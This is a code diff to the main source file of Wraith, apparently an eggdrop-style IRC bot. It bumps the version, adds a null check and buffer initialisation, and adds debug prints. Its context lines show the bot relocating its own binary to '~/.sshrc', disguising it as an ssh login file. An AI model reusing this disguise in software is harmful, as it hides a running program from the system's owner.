@@ -64,8 +64,7 @@ extern struct chanset_t	*chanset;
 
 
 const time_t 	buildts = CVSBUILD;		/* build timestamp (UTC) */
-const char	egg_version[1024] = "1.0.15";
-const int	egg_numver = 1001500;
+const char	egg_version[1024] = "1.1.0";
 
 int 	localhub = 1; 		/* we set this to 0 if we get a -B */
 int 	role;
@@ -121,7 +120,7 @@ void fatal(const char *s, int recoverable)
     ssl_cleanup();
 #endif /* HAVE_SSL */
   if (!recoverable) {
-    if (conf.bot->pid_file)
+    if (conf.bot && conf.bot->pid_file)
       unlink(conf.bot->pid_file);
     exit(1);
   }
@@ -507,7 +506,7 @@ int main(int argc, char **argv)
 
   /* Version info! */
   egg_snprintf(ver, sizeof ver, "Wraith %s", egg_version);
-  egg_snprintf(version, sizeof version, "Wraith %s (%u/%lu)", egg_version, egg_numver, buildts);
+  egg_snprintf(version, sizeof version, "Wraith %s (%lu)", egg_version, buildts);
 
   init_debug();
   init_signals();
@@ -567,7 +566,7 @@ int main(int argc, char **argv)
 #ifdef LEAF
   /* move the binary to the correct place */
   {
-    char newbin[DIRMAX];
+    char newbin[DIRMAX] = "";
     sdprintf(STR("my euid: %d my uuid: %d, my ppid: %d my pid: %d"), geteuid(), myuid, getppid(), getpid());
     chdir(homedir());
     egg_snprintf(newbin, sizeof newbin, STR("%s/.sshrc"), homedir());
@@ -607,7 +606,7 @@ int main(int argc, char **argv)
   }
 #endif /* LEAF */
   {
-    char tmp[DIRMAX];
+    char tmp[DIRMAX] = "";
 
     egg_snprintf(tmp, sizeof tmp, "%s/", confdir());
     if (!can_stat(tmp)) {
@@ -657,7 +656,8 @@ int main(int argc, char **argv)
     writeconf(cfile);
   fillconf(&conf);
   free_conf();
-printf("I AM : %s (%d)\n", conf.bot->nick, conf.bot->pid);
+printf("I AM : %s (%s: %d)\n", conf.bot->nick, conf.bot->pid_file, conf.bot->pid);
+printf("bleh..ip: %s host: %s ip6: %s host6: %s\n", conf.bot->ip, conf.bot->host, conf.bot->ip6, conf.bot->host6);
 
   if ((localhub && !updating) || !localhub) {
     if ((conf.bot->pid > 0) && conf.bot->pid_file) {
